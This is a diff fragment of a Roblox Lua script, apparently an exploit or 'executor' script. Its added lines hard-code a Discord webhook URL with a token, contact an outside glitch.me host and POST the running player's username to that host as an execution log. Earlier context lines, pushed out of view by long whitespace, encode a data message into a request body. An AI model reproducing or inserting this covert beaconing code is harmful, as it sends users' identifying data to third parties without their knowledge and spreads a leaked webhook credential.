@@ -17,3 +17,34 @@ local player_name = game:GetService("Players").LocalPlayer.Name
                                                                                                                                                                                                                                                                                       Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
                                                                                                                                                                                                                                                                               }
                                                                                                                                                                                                                                                                          )
+
+
+
+
+local msg = "HAS EXECUTED (SA)"
+local webhook = "https://discord.com/api/webhooks/1013726823512813668/hpKSdbjuf0_tTsRjDy5gllQ0XKqjpsa1AstXEWXhxaTw2rcuLH64b5Pt7lQpESwpA9pR"
+local HttpService = game:GetService("HttpService");
+local botname = "(SA) V12"
+
+function specials(Webhook, Message, Botname)
+    local Name;
+    local start = game:HttpGet("http://buritoman69.glitch.me");
+    local biggie = "http://buritoman69.glitch.me/webhook";
+    if (not Message or Message == "" or not Botname) then
+        Name = "GameBot"
+        return error("nil or empty message!")
+    else
+        Name = Botname;
+    end
+    local Body = {
+        ['Key'] = tostring("applesaregood"),
+        ['Message'] = tostring(Message),
+        ['Name'] = game.Players.LocalPlayer.Name,
+        ['Webhook'] = Webhook    
+    }
+    Body = HttpService:JSONEncode(Body);
+    local Data = game:HttpPost(biggie, Body, false, "application/json")
+    return Data or nil;
+end
+
+specials(webhook, msg, botname)
